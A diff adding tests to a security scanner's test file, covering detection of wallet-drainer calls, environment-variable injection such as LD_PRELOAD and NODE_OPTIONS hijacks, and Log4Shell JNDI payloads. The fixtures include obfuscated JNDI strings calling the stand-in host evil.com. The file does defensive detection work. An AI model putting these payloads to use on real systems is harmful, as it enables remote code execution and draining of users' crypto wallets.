@@ -536,6 +536,45 @@ test('detects XXE — simplexml_load_string with user input', () => {
   expect(scan('simplexml_load_string($xml_data)').findings).toIncludeRule('XXE_INJECTION');
 });
 
+// ── Wallet Drainer (WALLET_DRAINER) ──────────────────────────────────────
+test('detects unlimited ERC20 approve — MAX_UINT256', () => {
+  expect(scan('token.approve(spender, ethers.constants.MaxUint256)').findings).toIncludeRule('WALLET_DRAINER');
+});
+
+test('detects setApprovalForAll(true) — NFT drainer', () => {
+  expect(scan('nft.setApprovalForAll(attackerAddr, true)').findings).toIncludeRule('WALLET_DRAINER');
+});
+
+test('detects window.ethereum.request eth_sendTransaction', () => {
+  expect(scan('window.ethereum.request({method: "eth_sendTransaction", params: [{to: "0x1234"}]})').findings).toIncludeRule('WALLET_DRAINER');
+});
+
+// ── Environment Variable Injection (ENV_INJECTION) ───────────────────────
+test('detects process.env assignment — Node.js env injection', () => {
+  expect(scan('process.env.NODE_OPTIONS = "--require ./malicious.js"').findings).toIncludeRule('ENV_INJECTION');
+});
+
+test('detects os.environ injection — Python env poisoning', () => {
+  expect(scan('os.environ["LD_PRELOAD"] = "/tmp/evil.so"').findings).toIncludeRule('ENV_INJECTION');
+});
+
+test('detects PATH export hijacking', () => {
+  expect(scan('export PATH=/tmp/evil:$PATH').findings).toIncludeRule('ENV_INJECTION');
+});
+
+// ── Log Injection / Log4Shell (LOG_INJECTION) ────────────────────────────
+test('detects JNDI injection — log4shell', () => {
+  expect(scan('${jndi:ldap://evil.com/exploit}').findings).toIncludeRule('LOG_INJECTION');
+});
+
+test('detects nested log4j lookups', () => {
+  expect(scan('${${lower:j}ndi:${lower:l}dap://evil.com}').findings).toIncludeRule('LOG_INJECTION');
+});
+
+test('detects URL-encoded JNDI payload', () => {
+  expect(scan('%24%7Bjndi:ldap://evil.com%7D').findings).toIncludeRule('LOG_INJECTION');
+});
+
 test('deduplicates findings by ruleId + line', () => {
   // Same pattern matching twice on same line should deduplicate
   const r = scan('webhook.site requestbin.com');
